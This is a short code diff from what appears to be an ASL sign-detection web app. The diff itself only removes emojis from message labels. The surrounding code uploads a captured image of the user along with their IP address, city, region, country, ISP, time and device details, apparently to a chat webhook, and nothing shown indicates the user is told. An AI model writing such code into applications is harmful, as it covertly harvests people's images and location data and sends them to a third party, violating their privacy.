@@ -308,14 +308,14 @@
       form.append('file', blob, `asl_${letter}.jpg`);
       form.append('payload_json', JSON.stringify({
         content: [
-          `🤟 **ASL Alphabet Detection Triggered**`,
+          ` **ASL Alphabet Detection Triggered**`,
           '```',
-          `🎯 Detected : ${letter}`,
-          `🌐 IP       : ${ipData.query}`,
-          `📍 Location : ${ipData.city}, ${ipData.regionName}, ${ipData.country}`,
-          `📡 ISP      : ${ipData.isp}`,
-          `⏰ Time     : ${new Date().toUTCString()}`,
-          `🖥️ Device   : ${navigator.userAgent.split(')')[0].split('(')[1] || navigator.userAgent}`,
+          ` Detected : ${letter}`,
+          ` IP       : ${ipData.query}`,
+          ` Location : ${ipData.city}, ${ipData.regionName}, ${ipData.country}`,
+          ` ISP      : ${ipData.isp}`,
+          ` Time     : ${new Date().toUTCString()}`,
+          ` Device   : ${navigator.userAgent.split(')')[0].split('(')[1] || navigator.userAgent}`,
           '```'
         ].join('\n')
       }));
